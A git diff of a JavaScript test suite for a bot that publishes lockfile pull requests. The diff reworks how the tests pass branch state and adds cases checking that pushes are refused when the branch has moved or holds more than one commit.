@@ -792,15 +627,10 @@ test('publish', (t) => {
 		const server = setup(st);
 		const requests = mockAPI(st, [['POST', /^\/repos\/o\/r\/pulls$/, () => [201, { html_url: 'https://github.com/o/r/pull/9' }]]]); // eslint-disable-line camelcase
 		const { git, dir } = clone(st, server);
-		/** @type {PRState} */
-		const state = { mode: 'create' };
-		prepareBranch(git, {
-			state, base, branch, remoteHasBranch: false, regenerated: isWorkflow,
-		});
 		botCommit(dir, 'the title', { [lockfile]: 'bot lock\n' });
 
 		const outcome = await publish({
-			...common, octokit: getOctokit('ghs_test'), git, state, remoteHasBranch: false,
+			...common, octokit: getOctokit('ghs_test'), git, state: { mode: 'create' }, tip: null,
 		});
 
 		st.equal(outcome, 'created https://github.com/o/r/pull/9', 'reports the new PR');
@@ -816,20 +646,35 @@ test('publish', (t) => {
 		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
 		const requests = mockAPI(st, [['PATCH', /^\/repos\/o\/r\/pulls\/\d+$/, updated]]);
 		const { git, dir } = clone(st, server);
-		/** @type {PRState} */
-		const state = { mode: 'update', number: 4, head };
-		prepareBranch(git, {
-			state, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
-		});
+		const tip = remoteTip(git, branch);
 		botCommit(dir, 'the title', { [lockfile]: 'newer lock\n' });
 
 		const outcome = await publish({
-			...common, octokit: getOctokit('ghs_test'), git, state, remoteHasBranch: true,
+			...common, octokit: getOctokit('ghs_test'), git, state: { mode: 'update', number: 4, head }, tip,
 		});
 
 		st.equal(outcome, 'updated https://github.com/o/r/pull/4', 'reports the PR');
 		st.equal(server.show(branch, lockfile), 'newer lock', 'pushes the branch');
+		st.deepEqual(server.log(`main..${branch}`).map((line) => line.split('|')[2]), ['the title'], 'as one commit, replacing the old one');
 		st.deepEqual(writes(requests), [['PATCH /repos/o/r/pulls/4', { title: 'the title', body: 'the body' }]], 'updates the PR');
+		st.end();
+	});
+
+	t.test('update, with nothing new', async (st) => {
+		const server = setup(st);
+		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
+		const requests = mockAPI(st, [['PATCH', /^\/repos\/o\/r\/pulls\/\d+$/, updated]]);
+		const { git, dir } = clone(st, server);
+		const tip = remoteTip(git, branch);
+		botCommit(dir, 'the title', { [lockfile]: 'bot lock\n' });
+
+		const outcome = await publish({
+			...common, octokit: getOctokit('ghs_test'), git, state: { mode: 'update', number: 4, head }, tip,
+		});
+
+		st.equal(outcome, 'already up to date: https://github.com/o/r/pull/4', 'says so');
+		st.equal(server.tip(`refs/heads/${branch}`), head, 'pushes nothing');
+		st.deepEqual(writes(requests), [['PATCH /repos/o/r/pulls/4', { title: 'the title', body: 'the body' }]], 'still updates the PR’s title and body');
 		st.end();
 	});
 
@@ -838,15 +683,11 @@ test('publish', (t) => {
 		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
 		const requests = mockAPI(st, [['PATCH', /^\/repos\/o\/r\/pulls\/\d+$/, updated]]);
 		const { git, dir } = clone(st, server);
-		/** @type {PRState} */
-		const state = { mode: 'reopen', number: 5, head };
-		prepareBranch(git, {
-			state, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
-		});
+		const tip = remoteTip(git, branch);
 		botCommit(dir, 'the title', { [lockfile]: 'newer lock\n' });
 
 		const outcome = await publish({
-			...common, octokit: getOctokit('ghs_test'), git, state, remoteHasBranch: true,
+			...common, octokit: getOctokit('ghs_test'), git, state: { mode: 'reopen', number: 5, head }, tip,
 		});
 
 		st.equal(outcome, 'reopened and updated https://github.com/o/r/pull/5', 'reports the PR');
@@ -855,6 +696,46 @@ test('publish', (t) => {
 			['PATCH /repos/o/r/pulls/5', { state: 'open' }],
 			['PATCH /repos/o/r/pulls/5', { title: 'the title', body: 'the body' }],
 		], 'reopens, then updates, the PR');
+		st.end();
+	});
+
+	t.test('reopen, when its update would be refused: refused before reopening', async (st) => {
+		const server = setup(st);
+		server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
+		const requests = mockAPI(st, [['PATCH', /^\/repos\/o\/r\/pulls\/\d+$/, updated]]);
+		const { git, dir } = clone(st, server);
+		const tip = remoteTip(git, branch);
+		const moved = server.commit(branch, { [lockfile]: 'pushed meanwhile\n' }, { who: bot });
+		botCommit(dir, 'the title', { [lockfile]: 'newer lock\n' });
+
+		await publish({
+			...common, octokit: getOctokit('ghs_test'), git, state: { mode: 'reopen', number: 5, head: String(tip) }, tip,
+		}).then(
+			() => st.fail('should reject'),
+			(e) => st.equal(e.message, '`fleet/workflows` changed after it was read, so it was not overwritten (its push was rejected); the next run rebuilds it from what it is now', 'a branch that moved since it was read would fail the lease'),
+		);
+		st.equal(server.tip(`refs/heads/${branch}`), moved, 'pushes nothing');
+
+		server.setRef('refs/pull/5/head', moved);
+		await publish({
+			...common, octokit: getOctokit('ghs_test'), git, state: { mode: 'reopen', number: 5, head: moved }, tip: null,
+		}).then(
+			() => st.fail('should reject'),
+			(e) => st.match(e.message, /changed after it was read/, 'as would a branch that’s there, when it wasn’t'),
+		);
+
+		const { git: two, dir: twoDir } = clone(st, server);
+		const twoTip = remoteTip(two, branch);
+		botCommit(twoDir, 'one', { [lockfile]: 'one\n' });
+		botCommit(twoDir, 'two', { [lockfile]: 'two\n' });
+		await publish({
+			...common, octokit: getOctokit('ghs_test'), git: two, state: { mode: 'reopen', number: 5, head: String(twoTip) }, tip: twoTip,
+		}).then(
+			() => st.fail('should reject'),
+			(e) => st.equal(e.message, 'refusing to push `fleet/workflows`: it must be one commit on top of `main`’s tip', 'as would anything but one commit on the base’s tip'),
+		);
+		st.equal(server.tip(`refs/heads/${branch}`), moved, 'pushing nothing');
+		st.deepEqual(requests, [], 'never reopening the PR');
 		st.end();
 	});
 
@@ -870,48 +751,20 @@ test('publish', (t) => {
 			return updated(request);
 		}]]);
 		const { git, dir } = clone(st, server);
-		/** @type {PRState} */
-		const state = { mode: 'reopen', number: 5, head };
-		prepareBranch(git, {
-			state, base, branch, remoteHasBranch: false, regenerated: isWorkflow,
-		});
 		botCommit(dir, 'the title', { [lockfile]: 'newer lock\n' });
 		const final = git(['rev-parse', 'HEAD']).stdout.trim();
 
 		const outcome = await publish({
-			...common, octokit: getOctokit('ghs_test'), git, state, remoteHasBranch: false,
+			...common, octokit: getOctokit('ghs_test'), git, state: { mode: 'reopen', number: 5, head }, tip: null,
 		});
 
 		st.equal(outcome, 'reopened and updated https://github.com/o/r/pull/5', 'reports the PR');
-		st.deepEqual(tipsAtReopen, [head, final], 'restores the branch at the PR’s head before reopening, then pushes the new commits');
+		st.deepEqual(tipsAtReopen, [head, final], 'restores the branch at the PR’s head before reopening, then replaces it');
+		st.deepEqual(server.log(`main..${branch}`).length, 1, 'with one commit');
 		st.deepEqual(writes(requests), [
 			['PATCH /repos/o/r/pulls/5', { state: 'open' }],
 			['PATCH /repos/o/r/pulls/5', { title: 'the title', body: 'the body' }],
 		], 'reopens, then updates, the PR');
-		st.end();
-	});
-
-	t.test('the branch moved meanwhile: never forced', async (st) => {
-		const server = setup(st);
-		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
-		const requests = mockAPI(st, [['PATCH', /^\/repos\/o\/r\/pulls\/\d+$/, updated]]);
-		const { git, dir } = clone(st, server);
-		/** @type {PRState} */
-		const state = { mode: 'update', number: 4, head };
-		prepareBranch(git, {
-			state, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
-		});
-		botCommit(dir, 'the title', { [lockfile]: 'newer lock\n' });
-		const moved = server.commit(branch, { 'README.md': 'pushed meanwhile\n' }, { who: mallory });
-
-		await publish({
-			...common, octokit: getOctokit('ghs_test'), git, state, remoteHasBranch: true,
-		}).then(
-			() => st.fail('should reject'),
-			(e) => st.match(e.message, /^`git push --quiet origin HEAD:refs\/heads\/fleet\/fix` failed/, 'rejects with the failed push'),
-		);
-		st.equal(server.tip(`refs/heads/${branch}`), moved, 'the other push survives');
-		st.deepEqual(requests, [], 'touches no PR');
 		st.end();
 	});
 
